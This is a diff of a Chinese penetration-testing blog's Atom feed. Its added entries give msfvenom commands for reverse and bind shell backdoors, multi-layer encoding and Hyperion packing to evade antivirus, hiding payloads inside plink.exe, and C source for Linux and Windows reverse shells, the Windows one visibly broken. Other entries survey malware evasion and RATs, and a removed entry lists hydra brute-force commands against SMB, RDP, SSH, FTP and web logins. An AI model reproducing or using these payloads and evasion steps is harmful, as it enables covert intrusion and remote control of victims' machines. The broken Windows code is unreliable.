@@ -45,6 +45,84 @@
   </entry>
   
   <entry>
+    <title>msfvenom后门生成及Hyperion加密</title>
+    <link href="http://c.cat.plus/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/"/>
+    <id>http://c.cat.plus/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/</id>
+    <published>2016-08-04T11:16:32.000Z</published>
+    <updated>2020-06-10T08:37:20.700Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a><strong>生成反弹shell</strong></h4><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><p><strong>生成加密编码反弹shell</strong></p><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/ countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/ shikata_ga_nai -i 9 -b &apos;\x00&apos; -f exe -o a.exe</code></pre><ul><li>比较编码前后的检测率</li></ul><p><strong>查看文件md5值</strong></p><pre><code>md5sum *.exe</code></pre><p><strong>可读字符串查看</strong> 比较</p><pre><code>strings a.exestrings b.exe</code></pre><h4 id="利用模板隐藏shell"><a href="#利用模板隐藏shell" class="headerlink" title="利用模板隐藏shell"></a><strong>利用模板隐藏shell</strong></h4><pre><code>msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe#利用模板和加密生成msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; b.exe</code></pre><blockquote><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a><strong>软件保护</strong></h4></blockquote><ul><li>软件开发商为保护版权,采用的混淆和加密技术避免盗版逆向</li><li>常被恶意软件用于免杀目的</li></ul><p><strong>Hyperion</strong> (32bit PE程序加密器)</p><ul><li>Crypter / Container    # 解密器 / PE Loader</li></ul><pre><code>#克隆github源码git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zipunzip Hyperion-1.2.zip#加上静态库文件进行编译cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe#安装wine32运行环境dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32#生成后门msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.15 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o a.exe#使用Hyperion后门加壳wine h.exe a.exe b.exe</code></pre><p><strong>Windows reverse shell</strong></p><pre><code>wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><p><strong>Linux shell</strong></p><pre><code>gcc linux_revers_shell.c -o linux</code></pre><p><strong>linux_revers_shell.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sock.sin_family  = AF_INET;</span><br><span class="line">sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">dup2(s,<span class="number">0</span>);</span><br><span class="line">dup2(s,<span class="number">1</span>);</span><br><span class="line">dup2(s,<span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>windows.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOOKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"><span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"><span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line"><span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">hax.sin_family = AF_INET;</span><br><span class="line">hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;生成反弹shell&quot;&gt;&lt;a href=&quot;#生成反弹shell&quot; class=&quot;headerlink&quot; title=&quot;生成反弹shell&quot;&gt;&lt;/a&gt;&lt;strong&gt;生成反弹shell&lt;/strong&gt;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p windo
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
+    
+    
+      <category term="C" scheme="http://c.cat.plus/tags/C/"/>
+    
+      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
+    
+      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
+    
+      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
+    
+      <category term="strings" scheme="http://c.cat.plus/tags/strings/"/>
+    
+      <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
+    
+      <category term="gcc" scheme="http://c.cat.plus/tags/gcc/"/>
+    
+      <category term="wine" scheme="http://c.cat.plus/tags/wine/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>恶意程序及免杀技术现状</title>
+    <link href="http://c.cat.plus/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/"/>
+    <id>http://c.cat.plus/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/</id>
+    <published>2016-08-03T09:15:31.000Z</published>
+    <updated>2020-06-10T08:31:40.420Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a><strong>恶意软件</strong></h4><ul><li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装</li><li>出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…</li></ul><h4 id="防病毒软件"><a href="#防病毒软件" class="headerlink" title="防病毒软件"></a><strong>防病毒软件</strong></h4><ul><li><p>恶意程序最主要的防护手段</p><p>  杀毒软件/防病毒软件<br>  客户端/服务器/邮件防病毒</p></li><li><p>检测原理</p><p>  基于二进制文件中特种签名的黑名单检测方法<br>  于行为的分析方法(启发式)</p></li><li><p>事后手段</p><p>  永远落后于病毒发展</p></li></ul><h4 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a><strong>免杀技术</strong></h4><ul><li><p>修改二进制文件中的特征字符</p><p>  替换、擦除、修改</p></li><li><p>加密技术(crypter)</p><p>  通过加密使得特征字符不可读,从而逃避AV检测<br>  运行时分片分段的解密执行,注入进程或AV不检查的无害文件中</p></li><li><p>防病毒软件的检测</p><p>  恶意程序本身的特征字符<br>  加密器crypter的特征字符</p></li></ul><blockquote><h3 id="当前现状"><a href="#当前现状" class="headerlink" title="当前现状"></a><strong>当前现状</strong></h3></blockquote><p><strong>恶意软件制造者</strong></p><ul><li>编写私有RAT软件,避免普遍被AV所知的特征字符</li><li>使用独有crypter软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写而已代码的黑客,通过直接修改特征码的方式免杀</li><li>Fully UnDetectable是最高追求(FUD)</li></ul><p><strong>AV厂商</strong></p><ul><li>广泛采集样本,尽快发现新出现的而已程序,更新病毒库</li><li>一般新的恶意软件安全UD窗口期是一周左右</li><li>与恶意软件制造者永无休止的拉锯战</li><li>新的启发式检测技术尚有待完善(误杀漏杀)</li></ul><p><strong>单一AV广商的病毒库很难达到100%覆盖</strong></p><ul><li><p><code>https://www.virustotal.com/</code><br>  接口被某些国家的AV软件免费利用，没有自己的病毒库</p></li><li><p><code>http://www.virscan.org/</code></p></li><li><p>在线多引擎查杀网站与AV厂商共享信息</p></li><li><p>搞黑的在线多引擎查毒站</p></li><li><p><code>https://nodistribute.com/</code></p></li><li><p><code>http://viruscheckmate.com/check/</code></p></li></ul><p><strong>常用RAT软件</strong></p><ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul><h4 id="NanoCore-Bate-Release"><a href="#NanoCore-Bate-Release" class="headerlink" title="NanoCore - Bate Release"></a><strong>NanoCore</strong> - Bate Release</h4>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;恶意软件&quot;&gt;&lt;a href=&quot;#恶意软件&quot; class=&quot;headerlink&quot; title=&quot;恶意软件&quot;&gt;&lt;/a&gt;&lt;strong&gt;恶意软件&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序&lt;/li&gt;
+
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
+    
+    
+      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
+    
+      <category term="RAT" scheme="http://c.cat.plus/tags/RAT/"/>
+    
+      <category term="NanoCore" scheme="http://c.cat.plus/tags/NanoCore/"/>
+    
+      <category term="crypter" scheme="http://c.cat.plus/tags/crypter/"/>
+    
+  </entry>
+  
+  <entry>
     <title>stunnel4基于SSL加密的隧道工具</title>
     <link href="http://c.cat.plus/2015/07/11/Traffic_manipulation/stunnel4%E5%9F%BA%E4%BA%8ESSL%E5%8A%A0%E5%AF%86%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/"/>
     <id>http://c.cat.plus/2015/07/11/Traffic_manipulation/stunnel4%E5%9F%BA%E4%BA%8ESSL%E5%8A%A0%E5%AF%86%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/</id>
@@ -241,17 +319,17 @@
     
       <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
     
-      <category term="ncat" scheme="http://c.cat.plus/tags/ncat/"/>
-    
-      <category term="iodine" scheme="http://c.cat.plus/tags/iodine/"/>
+      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
     
       <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
     
       <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
     
-      <category term="ssh" scheme="http://c.cat.plus/tags/ssh/"/>
+      <category term="ncat" scheme="http://c.cat.plus/tags/ncat/"/>
     
-      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
+      <category term="iodine" scheme="http://c.cat.plus/tags/iodine/"/>
+    
+      <category term="ssh" scheme="http://c.cat.plus/tags/ssh/"/>
     
   </entry>
   
@@ -281,15 +359,15 @@
       <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
     
     
-      <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
-    
-      <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
-    
-      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
-    
       <category term="dns2tcp" scheme="http://c.cat.plus/tags/dns2tcp/"/>
     
       <category term="squid3" scheme="http://c.cat.plus/tags/squid3/"/>
+    
+      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
+    
+      <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
+    
+      <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
     
       <category term="Bodhi" scheme="http://c.cat.plus/tags/Bodhi/"/>
     
@@ -326,9 +404,9 @@
     
       <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
     
-      <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
-    
       <category term="VNC" scheme="http://c.cat.plus/tags/VNC/"/>
+    
+      <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
     
       <category term="proxychains" scheme="http://c.cat.plus/tags/proxychains/"/>
     
@@ -364,9 +442,9 @@
     
       <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
     
-      <category term="shell" scheme="http://c.cat.plus/tags/shell/"/>
-    
       <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
+    
+      <category term="shell" scheme="http://c.cat.plus/tags/shell/"/>
     
       <category term="隧道" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93/"/>
     
@@ -482,11 +560,11 @@
     
       <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
     
+      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
+    
       <category term="Ettercap" scheme="http://c.cat.plus/tags/Ettercap/"/>
     
       <category term="PTH" scheme="http://c.cat.plus/tags/PTH/"/>
-    
-      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
     
       <category term="中间人攻击" scheme="http://c.cat.plus/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
     
@@ -521,11 +599,11 @@
     
       <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
     
-      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
-    
       <category term="driftnet" scheme="http://c.cat.plus/tags/driftnet/"/>
     
       <category term="dsniff" scheme="http://c.cat.plus/tags/dsniff/"/>
+    
+      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
     
   </entry>
   
@@ -556,13 +634,13 @@
       <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
     
     
+      <category term="离线密码破解" scheme="http://c.cat.plus/tags/%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+    
       <category term="John" scheme="http://c.cat.plus/tags/John/"/>
     
       <category term="彩虹表" scheme="http://c.cat.plus/tags/%E5%BD%A9%E8%99%B9%E8%A1%A8/"/>
     
       <category term="Ophcrack" scheme="http://c.cat.plus/tags/Ophcrack/"/>
-    
-      <category term="离线密码破解" scheme="http://c.cat.plus/tags/%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
     
       <category term="Linux密码破解" scheme="http://c.cat.plus/tags/Linux%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
     
@@ -598,11 +676,9 @@
       <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
     
     
-      <category term="kali" scheme="http://c.cat.plus/tags/kali/"/>
-    
       <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
     
-      <category term="离线密码破解" scheme="http://c.cat.plus/tags/%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+      <category term="kali" scheme="http://c.cat.plus/tags/kali/"/>
     
       <category term="hashid" scheme="http://c.cat.plus/tags/hashid/"/>
     
@@ -611,6 +687,8 @@
       <category term="mimikatz" scheme="http://c.cat.plus/tags/mimikatz/"/>
     
       <category term="hashcat" scheme="http://c.cat.plus/tags/hashcat/"/>
+    
+      <category term="离线密码破解" scheme="http://c.cat.plus/tags/%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
     
   </entry>
   
@@ -641,9 +719,9 @@
       <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
     
     
-      <category term="彩虹表" scheme="http://c.cat.plus/tags/%E5%BD%A9%E8%99%B9%E8%A1%A8/"/>
-    
       <category term="hashcat" scheme="http://c.cat.plus/tags/hashcat/"/>
+    
+      <category term="彩虹表" scheme="http://c.cat.plus/tags/%E5%BD%A9%E8%99%B9%E8%A1%A8/"/>
     
       <category term="GPU" scheme="http://c.cat.plus/tags/GPU/"/>
     
@@ -687,78 +765,6 @@
       <category term="在线密码破解" scheme="http://c.cat.plus/tags/%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
     
       <category term="medusa" scheme="http://c.cat.plus/tags/medusa/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>hydra在线密码破解</title>
-    <link href="http://c.cat.plus/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
-    <id>http://c.cat.plus/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
-    <published>2015-05-22T19:15:23.000Z</published>
-    <updated>2020-05-25T07:44:13.738Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a><strong>Hydra</strong></h3></blockquote><ul><li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li></ul><h4 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a><strong>Windows密码破解</strong></h4><pre><code>hydra -l administrator -P pass.lst smb://1.1.1.1/admin$ -vVdhydra -l administrator -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></pre><h4 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a><strong>Linux密码破解</strong></h4><pre><code>hydra -l root -P pass.lst ssh://1.1.1.1 -t 1 -vV</code></pre><h4 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a><strong>其他服务密码破解</strong></h4><pre><code>hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></pre><h4 id="hydra图形化界面"><a href="#hydra图形化界面" class="headerlink" title="hydra图形化界面"></a><strong>hydra图形化界面</strong></h4><pre><code>xhydra</code></pre><h4 id="HTTP表单身份认证"><a href="#HTTP表单身份认证" class="headerlink" title="HTTP表单身份认证"></a><strong>HTTP表单身份认证</strong></h4><pre><code>hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:S=index.php&quot; -Vhydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:Login Failed&quot; -V    #失败/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:FooC:先访问指定页面取得cookieH:指定http头https-post-form、http-get-form、https-get-form-S：使用SSL连接</code></pre><h4 id="pw-inspector-hydra软件包附带工具"><a href="#pw-inspector-hydra软件包附带工具" class="headerlink" title="pw-inspector hydra软件包附带工具"></a><strong>pw-inspector</strong> hydra软件包附带工具</h4><p>按长度和字符集筛选字典</p><pre><code>pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></pre><h4 id="密码破解效率"><a href="#密码破解效率" class="headerlink" title="密码破解效率"></a><strong>密码破解效率</strong></h4><ul><li>密码复杂度(字典命中率)</li><li>带宽、协议、服务器性能、客户端性能</li><li>锁定阈值</li><li>单位时间最大登陆请求次数</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;h3 id=&quot;Hydra&quot;&gt;&lt;a href=&quot;#Hydra&quot; class=&quot;headerlink&quot; title=&quot;Hydra&quot;&gt;&lt;/a&gt;&lt;strong&gt;Hydra&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
-&lt;ul&gt;
-&lt;li&gt;九头蛇，砍去一个
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
-    
-      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
-    
-    
-      <category term="Linux密码破解" scheme="http://c.cat.plus/tags/Linux%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
-    
-      <category term="hydra" scheme="http://c.cat.plus/tags/hydra/"/>
-    
-      <category term="在线密码破解" scheme="http://c.cat.plus/tags/%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>密码破解方法及Crunch字典生成工具</title>
-    <link href="http://c.cat.plus/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/"/>
-    <id>http://c.cat.plus/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</id>
-    <published>2015-05-21T09:05:17.000Z</published>
-    <updated>2020-05-25T07:41:37.778Z</updated>
-    
